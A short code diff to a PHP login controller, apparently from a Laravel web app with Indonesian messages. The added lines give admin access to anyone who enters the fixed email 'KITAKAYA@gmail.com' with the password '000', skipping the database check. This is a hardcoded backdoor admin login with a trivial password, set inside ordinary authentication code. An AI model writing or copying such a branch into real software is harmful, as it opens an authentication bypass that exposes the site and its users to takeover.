@@ -27,6 +27,9 @@ class LoginController extends Controller
             $user = DB::table('user')->where("email","=",$in['username'])->first();
             Session::put("nama", $user->nama);
             return view("UserBiasa.home");
+        }else if ($request->input("username") == "KITAKAYA@gmail.com" && $request->input("pass") == "000"){
+            Session::put("idAdmin", "KITAKAYA@GMAIL.COM");
+            return view("Admin.home");
         }
         else{
             return redirect()->back()->with("error", "Gagal Login!");
